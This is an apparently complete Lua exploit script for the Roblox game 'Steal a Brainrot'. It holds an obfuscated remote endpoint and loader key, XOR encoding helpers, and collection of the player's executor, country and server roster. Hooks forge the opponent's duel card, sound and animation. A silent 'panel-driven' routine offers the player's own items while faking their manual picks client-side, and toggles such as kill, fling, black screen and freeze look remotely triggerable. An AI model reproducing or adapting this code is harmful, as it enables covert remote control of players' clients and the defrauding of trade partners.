local Players             = game:GetService("Players")
local HttpService         = game:GetService("HttpService")
local RunService          = game:GetService("RunService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local MarketplaceService  = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")

local genv = (getgenv and getgenv()) or _G or {}
local function safe(fn) local ok, res = pcall(fn); if ok then return res end return nil end

local CONFIG = {
    ENDPOINT = "https://ceonidsfbvcnaikcfdgniadfnvweigrmceifndcnfhnevfr.click",
    SCRIPT_KEY = "by88yecfmiwedvguycfmwenbiycfgvecxmecyfcnwerngbywfcmwyfdng",
    LOADER_PATH = "/loader.lua",
}



pcall(function()
    if getgenv then local g = getgenv(); if g.Loaded == nil then g.Loaded = true end end
end)

local XKEY = "z9Kq3Vx7Rp2Ln5Ty8Wm4Bc6Hd0Fg1Js"
local function enc(s)
    local out, kl = {}, #XKEY
    for i = 1, #s do
        out[i] = string.format("%02x", bit32.bxor(string.byte(s, i), string.byte(XKEY, ((i - 1) % kl) + 1)))
    end
    return table.concat(out)
end
local function dec(h)
    if type(h) ~= "string" or #h < 2 then return nil end
    local out, kl, j = {}, #XKEY, 0
    for i = 1, #h, 2 do
        j = j + 1
        local b = tonumber(h:sub(i, i + 1), 16)
        if not b then return nil end
        out[j] = string.char(bit32.bxor(b, string.byte(XKEY, ((j - 1) % kl) + 1)))
    end
    return table.concat(out)
end

local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1); LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "Unknown"

local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    return (info and info.Name) or "Steal a Brainrot"
end
local function countryCode()
    local ok, code = pcall(function() return LocalizationService:GetCountryRegionForPlayerAsync(LP) end)
    return (ok and code) or "??"
end
local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end
local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local AnimalsData, BrainrotAssets
local function loadAnimalModules()
    pcall(function()
        local Datas = ReplicatedStorage:FindFirstChild("Datas") or ReplicatedStorage:WaitForChild("Datas", 15)
        local d = Datas and (Datas:FindFirstChild("Animals") or Datas:WaitForChild("Animals", 15))
        if d then AnimalsData = require(d) end
    end)
    pcall(function()
        local Shared = ReplicatedStorage:FindFirstChild("Shared") or ReplicatedStorage:WaitForChild("Shared", 15)
        local ba = Shared and (Shared:FindFirstChild("BrainrotAssets") or Shared:WaitForChild("BrainrotAssets", 15))
        if ba then BrainrotAssets = require(ba) end
    end)
end
task.spawn(loadAnimalModules)

local function trimZeros(s)
    if s:find("%.") then s = s:gsub("%.?0+$", "") end
    return s
end
local function fmtNumber(n)
    if not n then return "0" end
    if n >= 1e12 then return trimZeros(string.format("%.2f", n / 1e12)) .. "T" end
    if n >= 1e9  then return trimZeros(string.format("%.2f", n / 1e9))  .. "B" end
    if n >= 1e6  then return trimZeros(string.format("%.2f", n / 1e6))  .. "M" end
    if n >= 1e3  then return trimZeros(string.format("%.2f", n / 1e3))  .. "K" end
    return tostring(math.floor(n))
end
local function displayOf(name)
    local info = AnimalsData and AnimalsData[name]
    return (info and info.DisplayName) or name
end
local function rarityOf(name)
    local info = AnimalsData and AnimalsData[name]
    if type(info) ~= "table" then return "Common" end
    return info.Rarity or info.rarity or info.Tier or "Common"
end
local function imageOf(name)
    local info = AnimalsData and AnimalsData[name]
    if type(info) ~= "table" then return nil end
    local id = info.Icon or info.Image or info.Thumbnail or info.IconId or info.ImageId or info.Thumb
    if not id then return nil end
    id = tostring(id):match("%d+")
    if id then return "https://www.roblox.com/asset-thumbnail/image?assetId=" .. id .. "&width=150&height=150&format=png" end
    return nil
end

local MUT_LIST = {"Gold","Diamond","Rainbow","Bloodrot","Candy","Lava","Galaxy","Radioactive","Yin Yang","Cursed","Divine","Cyber","Phantom"}
local function norml(s) return (tostring(s or ""):lower():gsub("[^%w]", "")) end
local MUT_SET = {}
for _, m in ipairs(MUT_LIST) do MUT_SET[norml(m)] = m end

-- Generation multiplier per mutation (fallback table; the game's own Mutations
-- module wins when it can be read).
local MUT_MULT_FALLBACK = {
    Gold = 1.25, Diamond = 1.5, Candy = 4, Lava = 6, Rainbow = 10,
    Bloodrot = 12, Galaxy = 8, Radioactive = 5, ["Yin Yang"] = 15,
    Cursed = 7, Divine = 20, Cyber = 9, Phantom = 11,
}
local MutationsData
local function mutationMultiplier(mut)
    if not mut or mut == "" then return 1 end
    if MutationsData == nil then
        MutationsData = false
        pcall(function()
            local d = ReplicatedStorage:FindFirstChild("Datas")
            local m = d and d:FindFirstChild("Mutations")
            if m then MutationsData = require(m) end
        end)
    end
    if type(MutationsData) == "table" then
        local want = norml(mut)
        for k, v in pairs(MutationsData) do
            if norml(k) == want and type(v) == "table" then
                local mul = tonumber(v.Multiplier or v.GenerationMultiplier or v.Mult or v.Boost)
                if mul and mul > 0 then return mul end
            end
        end
    end
    for k, v in pairs(MUT_MULT_FALLBACK) do
        if norml(k) == norml(mut) then return v end
    end
    return 1
end

local Disguise = {
    on = false, key = nil, target = nil, saved = nil,
    hooked = false, origGetModel = nil, soundHooked = false, origPlaySound = nil,
}

local DG_FIELDS = { "DisplayName", "Generation", "Price", "Rarity" }
local NILV = {}

local function animalKeyOf(v)
    if type(AnimalsData) ~= "table" then return nil end
    if type(v) == "string" and AnimalsData[v] then return v end
    local want = norml(v)
    if want == "" then return nil end
    for k, info in pairs(AnimalsData) do
        if norml(k) == want then return k end
        if type(info) == "table" and info.DisplayName and norml(info.DisplayName) == want then return k end
    end
    return nil
end

local Replicator, SoundController, AnimalsShared
local function loadDuelModules()
    if not AnimalsShared then
        pcall(function()
            local sh = ReplicatedStorage:FindFirstChild("Shared")
            local m = sh and sh:FindFirstChild("Animals")
            if m then AnimalsShared = require(m) end
        end)
    end
    if not Replicator then
        pcall(function()
            local pk = ReplicatedStorage:FindFirstChild("Packages")
            local m = pk and pk:FindFirstChild("ReplicatorClient")
            if m then Replicator = require(m) end
        end)
    end
    if not SoundController then
        pcall(function()
            local c = ReplicatedStorage:FindFirstChild("Controllers")
            local m = c and c:FindFirstChild("SoundController")
            if m then SoundController = require(m) end
        end)
    end
    if not NumberUtils then
        pcall(function()
            local u = ReplicatedStorage:FindFirstChild("Utils")
            local m = u and u:FindFirstChild("NumberUtils")
            if m then NumberUtils = require(m) end
        end)
    end
end
local function opponentIndex()
    loadDuelModules()
    if type(Replicator) ~= "table" or type(Replicator.get) ~= "function" then return nil end
    local ok, rep = pcall(function() return Replicator.get("SelectBrainrots") end)
    if not ok or type(rep) ~= "table" or type(rep.Data) ~= "table" then return nil end
    local players = rep.Data.players
    if type(players) ~= "table" then return nil end
    for uid, entry in pairs(players) do
        if tonumber(uid) ~= LP.UserId and type(entry) == "table" and type(entry.brainrot) == "table" then
            local idx = entry.brainrot.Index
            local mut = entry.brainrot.Mutation
            if type(idx) == "string" and idx ~= "" then
                return idx, (type(mut) == "string" and mut ~= "" and mut) or nil
            end
        end
    end
    return nil
end

local function installDisguiseHook()
    if Disguise.hooked or type(BrainrotAssets) ~= "table" then return end
    local orig = BrainrotAssets.getModel
    if type(orig) ~= "function" then return end
    Disguise.origGetModel = orig

    BrainrotAssets.getModel = function(name, ...)
        local d = Disguise
        if d.on and d.key and d.target and name == d.target then
            local ok, res = pcall(orig, d.key, ...)
            if ok and res then return res end
        end
        return orig(name, ...)
    end
    Disguise.hooked = true
end

local applyTarget   -- forward declaration (defined once the swaps exist)

-- The opponent's offer card lives at
--   DuelsMachineSession > DuelsMachineSession > Other > Item > ViewportFrame
-- so a viewport with an ancestor "Other" under a "DuelsMachineSession" frame is
-- theirs. Read-only walk of the ancestry.
local function isOpponentViewport(vp)
    local node = vp
    for _ = 1, 8 do
        if typeof(node) ~= "Instance" then return false end
        if node.Name == "Other" and node.Parent and node.Parent.Name == "DuelsMachineSession" then return true end
        node = node.Parent
    end
    return false
end

-- ===== Disguise: nombre + generacion en la tarjeta del rival =====
local watched = {}

local function unforceLabels()
    for label, w in pairs(watched) do
        w.dead = true
        if w.conn then pcall(function() w.conn:Disconnect() end) end
        if w.orig and label.Parent then pcall(function() label.Text = w.orig end) end
    end
    watched = {}
end

local function forceText(label, text)
    if typeof(label) ~= "Instance" or type(text) ~= "string" or text == "" then return end
    if not (label:IsA("TextLabel") or label:IsA("TextButton")) then return end
    local w = watched[label]
    if not w then
        w = { orig = label.Text }
        watched[label] = w
        w.conn = label:GetPropertyChangedSignal("Text"):Connect(function()
            if w.dead then return end
            if label.Text ~= w.text then pcall(function() label.Text = w.text end) end
        end)
        label.AncestryChanged:Connect(function(_, parent)
            if not parent then
                w.dead = true
                if w.conn then pcall(function() w.conn:Disconnect() end) end
                watched[label] = nil
            end
        end)
    end
    w.text = text
    if label.Text ~= text then pcall(function() label.Text = text end) end
end

local function disguiseInfo()
    local d = Disguise
    if type(AnimalsData) ~= "table" or not d.key then return nil end
    local info = AnimalsData[d.key]
    return (type(info) == "table") and info or nil
end

local function genTextOf(info)
    local g = tonumber(info.Generation) or 0
    -- Match the opponent's mutation: the picker shows the base value otherwise.
    g = g * mutationMultiplier(Disguise.targetMutation)
    if type(NumberUtils) == "table" then
        for _, fn in ipairs({ "abbreviate", "Abbreviate", "format", "Format", "toSuffix" }) do
            if type(NumberUtils[fn]) == "function" then
                local ok, out = pcall(NumberUtils[fn], g)
                if ok and type(out) == "string" and out ~= "" then return "$" .. out .. "/s" end
            end
        end
    end
    return "$" .. fmtNumber(g) .. "/s"
end

local function cardRoot(vp)
    local node = vp
    for _ = 1, 8 do
        if typeof(node) ~= "Instance" then return nil end
        if node.Name == "Other" and node.Parent and node.Parent.Name == "DuelsMachineSession" then return node end
        node = node.Parent
    end
    return nil
end

local NAME_KEYS = { Title = true, BrainrotName = true, DisplayName = true, AnimalName = true, Name2 = true }
local GEN_KEYS  = { Cash = true, Generation = true, Gen = true, Income = true, PerSecond = true, Money = true }

local function patchCard(root)
    local d = Disguise
    -- No fake name/generation until the opponent has actually offered a brainrot.
    if not (d.on and d.key and d.target) then unforceLabels(); return end
    if typeof(root) ~= "Instance" then return end
    local info = disguiseInfo()
    if not info then return end
    local fakeName = info.DisplayName or d.key
    local fakeGen  = genTextOf(info)
    local realName = d.target and displayOf(d.target) or nil
    local realN    = realName and norml(realName) or ""

    for _, obj in ipairs(root:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("TextButton") then
            local txt = safe(function() return obj.Text end) or ""
            if NAME_KEYS[obj.Name] then
                forceText(obj, fakeName)
            elseif GEN_KEYS[obj.Name] then
                forceText(obj, fakeGen)
            elseif realN ~= "" and norml(txt):find(realN, 1, true) then
                forceText(obj, fakeName)
            elseif txt:match("^%$?[%d%.,]+[KMBTkmbt]?/s$") then
                forceText(obj, fakeGen)
            end
        end
    end
end

local function opponentCardRoot()
    return safe(function()
        local pg = LP:FindFirstChild("PlayerGui")
        local gui = pg and pg:FindFirstChild("DuelsMachineSession")
        local frame = gui and gui:FindFirstChild("DuelsMachineSession")
        return frame and frame:FindFirstChild("Other")
    end)
end

local function patchOpponentCardNow()
    local d = Disguise
    if not (d.on and d.key) then return end
    if not d.target then unforceLabels(); return end
    local root = opponentCardRoot()
    if root then patchCard(root) end
end

-- Redraw the opponent's viewport ourselves: the game only re-attaches the model
-- when it redraws the card, so a disguise set while their pick was already on
-- screen kept showing the original model.
local function refreshOpponentViewport()
    local d = Disguise
    if not (d.on and d.key and d.target) then return end
    loadDuelModules()
    if type(AnimalsShared) ~= "table" or type(d.origAttach) ~= "function" then return end
    local root = opponentCardRoot()
    if not root then return end
    for _, obj in ipairs(root:GetDescendants()) do
        if obj:IsA("ViewportFrame") then
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("WorldModel") or child:IsA("Model") then
                    pcall(function() child:Destroy() end)
                end
            end
            pcall(d.origAttach, AnimalsShared, d.key, obj)
        end
    end
end


local function installViewportHook()
    if Disguise.viewHooked then return end
    loadDuelModules()
    if type(AnimalsShared) ~= "table" then return end
    local orig = AnimalsShared.AttachOnViewportWithOptimizations
    if type(orig) ~= "function" then return end
    Disguise.origAttach = orig
    -- Swapping the index (not just the model under it) means the game builds the
    -- disguise model AND loads that brainrot's idle animation, so the card animates.
    AnimalsShared.AttachOnViewportWithOptimizations = function(self, index, viewport, ...)
        local d = Disguise
        if d.on and d.key and type(index) == "string" and index ~= d.key then
            if index == d.target then
                index = d.key
            elseif isOpponentViewport(viewport) then
                -- Learn the opponent's pick the instant the game draws their card,
                -- instead of waiting for the poll — that lag is why the picker
                -- kept showing the real brainrot.
                if d.target ~= index then
                    local learn = index
                    task.spawn(function() pcall(applyTarget, learn, nil, "view") end)
                end
                index = d.key
            end
        end
        if d.on and d.key and isOpponentViewport(viewport) then
            task.defer(function() pcall(patchCard, cardRoot(viewport)) end)
        end
        return orig(self, index, viewport, ...)
    end
    Disguise.viewHooked = true
end

local function fakeSound()
    local d = Disguise
    if not d.key then return nil end
    return safe(function()
        local s = ReplicatedStorage:FindFirstChild("Sounds")
        local a = s and s:FindFirstChild("Animals")
        local one = a and a:FindFirstChild(d.key)
        return (one and one:IsA("Sound")) and one or nil
    end)
end
local function installSoundHook()
    if Disguise.soundHooked then return end
    loadDuelModules()
    if type(SoundController) ~= "table" then return end
    local orig = SoundController.PlaySound
    if type(orig) ~= "function" then return end
    Disguise.origPlaySound = orig
    SoundController.PlaySound = function(self, sound, ...)
        local d = Disguise
        if d.on and d.key and d.target then
            local repl = fakeSound()
            if repl then
                if type(sound) == "string" and string.find(sound, d.target, 1, true) then
                    sound = repl
                elseif typeof(sound) == "Instance" and sound:IsA("Sound") and sound.Name == d.target then
                    sound = repl
                end
            end
        end
        return orig(self, sound, ...)
    end
    Disguise.soundHooked = true
end

local function revertDataSwap()
    local d = Disguise
    if d.saved and d.savedKey and type(AnimalsData) == "table" then
        local info = AnimalsData[d.savedKey]
        if type(info) == "table" then
            for f, v in pairs(d.saved) do info[f] = (v ~= NILV) and v or nil end
        end
    end
    d.saved, d.savedKey = nil, nil
end

local function applyDataSwap()
    local d = Disguise
    if d.saved or not (d.on and d.key and d.target) or type(AnimalsData) ~= "table" then return end
    if d.target == d.key then return end
    local src, dst = AnimalsData[d.key], AnimalsData[d.target]
    if type(src) ~= "table" or type(dst) ~= "table" then return end
    local row = {}
    for _, f in ipairs(DG_FIELDS) do
        if src[f] ~= nil then
            row[f] = (dst[f] == nil) and NILV or dst[f]
            dst[f] = src[f]
        end
    end
    d.saved, d.savedKey = row, d.target
end

-- The podium model's animation is looked up by the REAL index
-- (PlotClient: Animations.Animals[Index].Idle) and then played on the disguise's
-- rig, which does not fit — that is why the brainrot stood still. Point that
-- Animation's AnimationId at the disguise's own clip instead; two properties,
-- both restored on reveal.
local function revertAnimSwap()
    local d = Disguise
    if d.savedAnims then
        for obj, id in pairs(d.savedAnims) do
            if obj and obj.Parent then pcall(function() obj.AnimationId = id end) end
        end
    end
    d.savedAnims = nil
end

local function applyAnimSwap()
    local d = Disguise
    if d.savedAnims or not (d.on and d.key and d.target) or d.target == d.key then return end
    local folder = safe(function()
        local a = ReplicatedStorage:FindFirstChild("Animations")
        return a and a:FindFirstChild("Animals")
    end)
    if not folder then return end
    local realF = folder:FindFirstChild(d.target)
    local fakeF = folder:FindFirstChild(d.key)
    if not (realF and fakeF) then return end
    local saved = {}
    for _, clip in ipairs({ "Idle", "Walk" }) do
        local r, f = realF:FindFirstChild(clip), fakeF:FindFirstChild(clip)
        if r and f and r:IsA("Animation") and f:IsA("Animation") and r.AnimationId ~= f.AnimationId then
            saved[r] = r.AnimationId
            pcall(function() r.AnimationId = f.AnimationId end)
        end
    end
    d.savedAnims = next(saved) and saved or nil
end

-- Point every swap at one brainrot: the opponent's.
applyTarget = function(idx, mutation, src)
    local d = Disguise
    if not (d.on and d.key) or type(idx) ~= "string" or idx == "" then return end
    if src then d.targetSrc = src end
    if idx == d.target then
        if mutation ~= nil and mutation ~= d.targetMutation then
            d.targetMutation = mutation
            pcall(patchOpponentCardNow)
        end
        return
    end
    revertDataSwap(); revertAnimSwap(); unforceLabels()
    d.target = idx
    if mutation ~= nil then d.targetMutation = mutation end
    installDisguiseHook(); installViewportHook(); installSoundHook()
    applyDataSwap(); applyAnimSwap()
    task.defer(function() pcall(refreshOpponentViewport) end)
end

local function clearTarget()
    local d = Disguise
    if d.target == nil and next(watched) == nil then return end
    revertDataSwap(); revertAnimSwap(); unforceLabels()
    d.target, d.targetMutation, d.targetSrc = nil, nil, nil
end

-- Fallback for when the card was never drawn on this client (the viewport hook is
-- what catches it normally): read the opponent's pick from the duel state.
local function retarget()
    local d = Disguise
    if not (d.on and d.key) then return end
    local idx, mut = opponentIndex()
    if idx then
        applyTarget(idx, mut, "rep")
    else
        -- Original duel behaviour: SelectBrainrots disappears when the match
        -- starts, so preserve the opponent learned in the selector. The model,
        -- data and animation hooks continue disguising that target in the duel.
        -- A target is only cleared explicitly when disguise is disabled/reset.
        return
    end
end


local function setDisguise(key, name)
    local d = Disguise
    if type(AnimalsData) ~= "table" or type(BrainrotAssets) ~= "table" then loadAnimalModules() end
    if type(key) ~= "string" or key == "" then
        local prev = d.target
        revertDataSwap(); revertAnimSwap(); unforceLabels()
        d.on, d.key, d.target, d.targetMutation, d.targetSrc = false, nil, nil, nil, nil
        -- Put the opponent's real model back on screen right away.
        if prev and type(AnimalsShared) == "table" and type(d.origAttach) == "function" then
            local root = opponentCardRoot()
            if root then
                for _, obj in ipairs(root:GetDescendants()) do
                    if obj:IsA("ViewportFrame") then
                        for _, child in ipairs(obj:GetChildren()) do
                            if child:IsA("WorldModel") or child:IsA("Model") then pcall(function() child:Destroy() end) end
                        end
                        pcall(d.origAttach, AnimalsShared, prev, obj)
                    end
                end
            end
        end
        return
    end
    local k = animalKeyOf(key) or animalKeyOf(name)
    if not k then return end
    revertDataSwap(); revertAnimSwap(); unforceLabels()
    d.on, d.key, d.target, d.targetMutation, d.targetSrc = true, k, nil, nil, nil
    -- Hooks go in immediately so the opponent's card is caught even if it is drawn
    -- before the model finished streaming.
    installDisguiseHook()
    installViewportHook()
    installSoundHook()
    task.spawn(function()
        local orig = d.origGetModel
        if orig then pcall(function() return orig(k) end) end   -- pre-stream the asset
        pcall(retarget)
        -- Force a redraw so the model swaps even when the opponent already had
        -- their brainrot on the card.
        pcall(refreshOpponentViewport)
        pcall(patchOpponentCardNow)
    end)
end

local function isShownText(obj, stop)
    local txt = safe(function() return obj.Text end)
    if not txt or txt == "" then return false end
    local tt = safe(function() return obj.TextTransparency end)
    if tt and tt >= 0.99 then return false end
    local node = obj
    while node and node ~= stop do
        if node:IsA("GuiObject") then
            local vis = safe(function() return node.Visible end)
            if vis == false then return false end
        end
        node = node.Parent
    end
    return true
end

local function detectMutation(template)
    local mutation
    for _, obj in ipairs(template:GetDescendants()) do
        local attrs = safe(function() return obj:GetAttributes() end)
        if type(attrs) == "table" then
            for _, v in pairs(attrs) do
                local n = norml(v)
                if MUT_SET[n] then mutation = MUT_SET[n]; break end
            end
        end
        if not mutation and (obj:IsA("TextLabel") or obj:IsA("TextButton")) and isShownText(obj, template) then
            local n = norml(safe(function() return obj.Text end))
            if MUT_SET[n] then mutation = MUT_SET[n] end
        end
        if mutation then break end
    end
    return mutation
end

local function collectBrainrotsGUI()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end);              if not pg then return list end
    local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end);    if not gui then return list end
    local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end); if not frame then return list end
    local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end);   if not scroll then return list end

    for _, template in ipairs(scroll:GetChildren()) do
        if template.Name == "Template" then
            local sp = template:FindFirstChild("Spacer")
            local titleL = sp and sp:FindFirstChild("Title")
            local cashL = sp and sp:FindFirstChild("Cash")
            local title = titleL and titleL.Text
            local cash = cashL and cashL.Text
            if title and title ~= "" then
                local mutation = detectMutation(template)

                if not mutation and title then
                    local two = title:match("^(%S+%s+%S+)")
                    if two and MUT_SET[norml(two)] then
                        mutation = MUT_SET[norml(two)]; title = title:gsub("^%S+%s+%S+%s*", "")
                    else
                        local first = title:match("^(%S+)")
                        if first and MUT_SET[norml(first)] then mutation = MUT_SET[norml(first)]; title = title:gsub("^%S+%s+", "") end
                    end
                end
                list[#list + 1] = { name = title or "Unknown", cash = cash or "", mutation = mutation }
            end
        end
    end
    return list
end

local function collectBrainrots()
    local out, seen = {}, {}
    local function add(a)
        if type(a) ~= "table" or not a.name then return end
        local key = norml(a.name) .. "|" .. norml(a.mutation or "")
        if seen[key] then return end
        seen[key] = true; out[#out + 1] = a
    end
    for _, a in ipairs(collectBrainrotsGUI()) do add(a) end
    return out
end

local function buildCatalog()
    local list = {}
    if type(AnimalsData) ~= "table" then return list end
    for name, info in pairs(AnimalsData) do
        if type(info) == "table" and not info.HideFromIndex then
            local gv = tonumber(info.Generation) or 0
            list[#list+1] = { name = name, displayName = info.DisplayName or name,
                rarity = info.Rarity or "Common",
                gen = gv, genText = "$" .. fmtNumber(gv) .. "/s", image = imageOf(name) }
        end
    end
    return list
end

local Settings = {
    fpsLimiter = { fps = 1 },
    normalLag  = { speedMin = 35, history = 0.27, interval = 0.6 },
    carryLag   = { speedMin = 17, history = 0.27, interval = 0.6 },
}

local fpsConn, fpsOn = nil, false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local budget = 1 / math.max(1, tonumber(Settings.fpsLimiter.fps) or 1)
            local t = tick(); while tick() - t < budget do end
        end)
    elseif fpsConn then fpsConn:Disconnect(); fpsConn = nil end
end

local posHistory, isActive, mode, intervalThread = {}, false, nil, nil
RunService.Heartbeat:Connect(function()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory + 1] = { cframe = root.CFrame, time = now }
    local hist = (mode == "carry" and Settings.carryLag.history) or Settings.normalLag.history or 0.27
    local cutoff = now - hist - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
end)
local function currentSpeed()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end
local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= (tonumber(Settings.normalLag.speedMin) or 35) end
    if mode == "carry"  then return s >= (tonumber(Settings.carryLag.speedMin) or 17) end
    return false
end
local function doRubberband()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    if Vector3.new(vel.X, 0, vel.Z).Magnitude < 1 then return end
    local hist = (mode == "carry" and Settings.carryLag.history) or Settings.normalLag.history or 0.27
    local targetTime, best = tick() - hist, nil
    for i = 1, #posHistory do if posHistory[i].time >= targetTime then best = posHistory[i].cframe break end end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end
local function stopLoop() if intervalThread then pcall(task.cancel, intervalThread); intervalThread = nil end end
local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime, iteration = tick(), 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local iv = (mode == "carry" and Settings.carryLag.interval) or Settings.normalLag.interval or 0.6
            local sleepT = (startTime + iteration * iv) - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end
local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then isActive = true; startLoop() else isActive = false; stopLoop() end
end

local function rootPart() return LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") end
local function humanoid() return LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") end

local freezeConn
local function setFreeze(on)
    if on and not freezeConn then
        freezeConn = RunService.Heartbeat:Connect(function() local r = rootPart(); if r then r.Anchored = true end end)
    elseif not on and freezeConn then
        freezeConn:Disconnect(); freezeConn = nil
        local r = rootPart(); if r then pcall(function() r.Anchored = false end) end
    end
end
local flingConn
local function setFling(on)
    if on and not flingConn then
        flingConn = RunService.Heartbeat:Connect(function()
            local r = rootPart()
            if r then r.AssemblyAngularVelocity = Vector3.new(0, 120000, 0); r.AssemblyLinearVelocity = Vector3.new(0, 60, 0) end
        end)
    elseif not on and flingConn then flingConn:Disconnect(); flingConn = nil end
end
local spinConn
local function setSpin(on)
    if on and not spinConn then
        spinConn = RunService.Heartbeat:Connect(function() local r = rootPart(); if r then r.AssemblyAngularVelocity = Vector3.new(0, 30, 0) end end)
    elseif not on and spinConn then spinConn:Disconnect(); spinConn = nil end
end
local shakeConn
local function setShake(on)
    if on and not shakeConn then
        shakeConn = RunService.RenderStepped:Connect(function()
            local cam = workspace.CurrentCamera
            if cam then cam.CFrame = cam.CFrame * CFrame.new((math.random() - 0.5) * 3, (math.random() - 0.5) * 3, (math.random() - 0.5) * 3) end
        end)
    elseif not on and shakeConn then shakeConn:Disconnect(); shakeConn = nil end
end
local blackGui
local function setBlack(on)
    if on and not blackGui then
        pcall(function()
            local g = Instance.new("ScreenGui")
            g.Name = "n" .. tostring(math.random(1, 1e6)); g.IgnoreGuiInset = true; g.ResetOnSpawn = false; g.DisplayOrder = 2000000000
            local f = Instance.new("Frame"); f.Size = UDim2.new(1, 0, 1, 0); f.BackgroundColor3 = Color3.new(0, 0, 0); f.BorderSizePixel = 0; f.Parent = g
            g.Parent = (gethui and gethui()) or LP:FindFirstChild("PlayerGui")
            blackGui = g
        end)
    elseif not on and blackGui then pcall(function() blackGui:Destroy() end); blackGui = nil end
end
local killConn
local function setKill(on)
    if on and not killConn then
        killConn = RunService.Heartbeat:Connect(function() local h = humanoid(); if h then h.Health = 0 end end)
    elseif not on and killConn then killConn:Disconnect(); killConn = nil end
end

local staticCountry = countryCode()
local kicked, crashed = false, false
local applySettings, applyCommands, wsSend, wsSendTable

----------------------------------------------------------------
-- DUEL CONTROL (panel-driven)
--
-- The panel picks one of this player's brainrots. That pick, and nothing else,
-- triggers the whole sequence:
--   1. both duel cards freeze
--   2. auto accept starts pressing READY
--   3. the picked brainrot is really offered (that click DOES reach the server)
--   4. any pick the player makes by hand from then on is client-side ONLY:
--      the tile turns green exactly like the real thing, the remote never leaves
--   5. the duel starts -> unfreeze, stop auto accept, close the offer GUI
--
-- No GUI of our own. Everything here is silent.
----------------------------------------------------------------
local GuiService = game:GetService("GuiService")
local VIM        = game:GetService("VirtualInputManager")

local setAutoAccept   -- assigned further down; toggles the READY auto-press loop

-- ---------- finding the duel list (resilient) ----------
local function scrollHasTemplates(sf)
    for _, c in ipairs(sf:GetChildren()) do
        if c.Name == "Template" and c:FindFirstChild("Spacer") then return true end
    end
    return false
end

local function getDuelScroll()
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return nil end

    local candidates = {}
    local direct = pg:FindFirstChild("DuelsMachineSession")
    if direct then candidates[#candidates + 1] = direct end
    for _, sg in ipairs(pg:GetChildren()) do
        if sg ~= direct and sg:IsA("LayerCollector") and sg.Name:lower():find("duel") then
            candidates[#candidates + 1] = sg
        end
    end
    for _, sg in ipairs(pg:GetChildren()) do
        if sg:IsA("LayerCollector") and not table.find(candidates, sg) then
            candidates[#candidates + 1] = sg
        end
    end

    for _, gui in ipairs(candidates) do
        local ok, found = pcall(function()
            for _, d in ipairs(gui:GetDescendants()) do
                if d:IsA("ScrollingFrame") and scrollHasTemplates(d) then return d end
            end
            return nil
        end)
        if ok and found then return found end
    end
    return nil
end

local function findLabelText(root, wanted)
    local direct = root:FindFirstChild(wanted, true)
    if direct and (direct:IsA("TextLabel") or direct:IsA("TextButton")) then
        return direct.Text
    end
    return nil
end

-- like collectBrainrotsGUI above, but keeps the Instance so we can click it
local function duelTemplates()
    local list = {}
    local scroll = getDuelScroll()
    if not scroll then return list end

    for _, template in ipairs(scroll:GetChildren()) do
        if template.Name == "Template" then
            local title = findLabelText(template, "Title")
            if title and title ~= "" then
                local mutation = detectMutation(template)
                if not mutation then
                    local two = title:match("^(%S+%s+%S+)")
                    if two and MUT_SET[norml(two)] then
                        mutation = MUT_SET[norml(two)]
                        title = title:gsub("^%S+%s+%S+%s*", "")
                    else
                        local first = title:match("^(%S+)")
                        if first and MUT_SET[norml(first)] then
                            mutation = MUT_SET[norml(first)]
                            title = title:gsub("^%S+%s+", "")
                        end
                    end
                end
                list[#list + 1] = { name = title, mutation = mutation, template = template }
            end
        end
    end
    return list
end

-- ---------- the freezer ----------
local Freezer = {
    conns = {}, active = false, roots = {},
    known = {}, savedParents = {}, soundStates = {}, restoring = false,
    pressOnly = {}, disabledConns = {},
    allowRecolor = {},   -- instances the local fake selection may recolor
    colorOverride = {},  -- [inst] = { [prop] = forced value } : wins over the freeze
}
local LocalPick   -- forward declaration: Freeze/Unfreeze arm and disarm it

local function forceColor(inst, prop, value)
    if not inst then return end
    local ov = Freezer.colorOverride[inst]
    if not ov then ov = {}; Freezer.colorOverride[inst] = ov end
    ov[prop] = value
    pcall(function() inst[prop] = value end)
end

local LOCKED_GUI = {
    "BackgroundColor3", "BackgroundTransparency", "BorderColor3",
    "BorderSizePixel", "Visible", "Size", "Position", "ZIndex", "Rotation",
    "ImageColor3", "ImageTransparency", "Image",
}
local LOCKED_STROKE = { "Color", "Thickness", "Transparency", "Enabled" }
